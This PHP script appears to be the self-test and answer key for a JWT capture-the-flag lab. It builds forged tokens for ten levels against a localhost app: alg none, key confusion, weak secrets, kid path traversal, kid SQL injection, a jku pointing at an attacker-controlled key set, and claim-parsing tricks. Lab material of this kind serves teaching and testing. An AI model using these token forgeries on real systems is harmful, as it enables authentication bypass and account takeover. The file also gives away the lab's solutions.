<?php
/**
 * Self-test: runs the intended solution for every level against the live app
 * and reports whether the flag came back. Run inside the container:
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($fields),
        'timeout' => 10,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body): void
{
    global $pass, $fail;
    $want = jwt_flag($level);
    if (strpos($body, $want) !== false) {
        $pass++;
        echo "  PASS  level $level  $want\n";
    } else {
        $fail++;
        echo "  FAIL  level $level  (expected $want)\n";
    }
}

$admin = ['sub' => 'guest', 'role' => 'admin', 'exp' => 9999999999];

echo "JWT Lab self-test\n-----------------\n";

/* 1 - read a claim */
check(1, post("$base/level1.php", ['answer' => 'promo-code-QX7T2']));

/* 2 - alg none */
$h = jwt_b64url_encode('{"typ":"JWT","alg":"none"}');
$p = jwt_b64url_encode(json_encode($admin));
check(2, post("$base/level2.php", ['token' => "$h.$p."]));

/* 3 - decode instead of verify */
check(3, post("$base/level3.php", ['token' => jwt_encode(['typ' => 'JWT', 'alg' => 'HS256'], $admin, 'garbage')]));

/* 4 - weak secret from the built-in wordlist */
check(4, post("$base/level4.php", ['token' => jwt_encode(['typ' => 'JWT', 'alg' => 'HS256'], $admin, 'letmein123')]));

/* 5 - RS256 -> HS256, public key as the HMAC secret */
check(5, post("$base/level5.php", ['token' => jwt_encode(['typ' => 'JWT', 'alg' => 'HS256'], $admin, jwt_public_key())]));

/* 6 - kid traversal to an empty file */
check(6, post("$base/level6.php", [
    'token' => jwt_encode(['typ' => 'JWT', 'alg' => 'HS256', 'kid' => '../../../../../../dev/null'], $admin, ''),
]));

/* 7 - kid SQL injection returning a chosen key */
check(7, post("$base/level7.php", [
    'token' => jwt_encode(['typ' => 'JWT', 'alg' => 'HS256', 'kid' => "x' UNION SELECT 'hackinlab'-- "], $admin, 'hackinlab'),
]));

/* 8 - jku pointing at an attacker-controlled key set */
$res = openssl_pkey_new(['private_key_bits' => 2048, 'private_key_type' => OPENSSL_KEYTYPE_RSA]);
openssl_pkey_export($res, $priv);
$det  = openssl_pkey_get_details($res);
$kid  = 'attacker-1';
$jwks = json_encode(['keys' => [[
    'kty' => 'RSA', 'kid' => $kid, 'use' => 'sig', 'alg' => 'RS256',
    'n' => jwt_b64url_encode($det['rsa']['n']),
    'e' => jwt_b64url_encode($det['rsa']['e']),
]]]);
$pasteBody = post("$base/paste.php", ['content' => $jwks]);
if (preg_match('~http://localhost/paste\.php\?id=([a-f0-9]+)~', $pasteBody, $m)) {
    $jku = "http://localhost/paste.php?id={$m[1]}&h=keys.hackinlab.internal";
    check(8, post("$base/level8.php", [
        'token' => jwt_encode(['typ' => 'JWT', 'alg' => 'RS256', 'kid' => $kid, 'jku' => $jku], $admin, $priv),
    ]));
} else {
    echo "  FAIL  level 8  (paste.php did not return a server-side URL)\n";
    $fail++;
}

/* 9 - guard reads role, app reads user.role */
check(9, post("$base/level9.php", [
    'token' => jwt_encode(['typ' => 'JWT', 'alg' => 'HS256'],
        ['sub' => 'guest', 'role' => 'user', 'user' => ['id' => 41, 'role' => 'admin'], 'exp' => 9999999999],
        'letmein123'),
]));

/* 10a - duplicate key: regex takes the first, json_decode the last */
$h  = jwt_b64url_encode('{"typ":"JWT","alg":"HS256"}');
$p  = jwt_b64url_encode('{"sub":"guest","role":"user","role":"admin","exp":9999999999}');
check(10, post("$base/level10.php", ['token' => "$h.$p." . jwt_sign_hs256("$h.$p", 'letmein123')]));

/* 10b - unicode escape: the regex never sees the key at all */
$p2 = jwt_b64url_encode('{"sub":"guest","\u0072ole":"admin","exp":9999999999}');
$b  = post("$base/level10.php", ['token' => "$h.$p2." . jwt_sign_hs256("$h.$p2", 'letmein123')]);
echo strpos($b, jwt_flag(10)) !== false
    ? "  PASS  level 10 (alternative: \\u0072ole escape)\n"
    : "  WARN  level 10 alternative solution did not land\n";

echo "-----------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
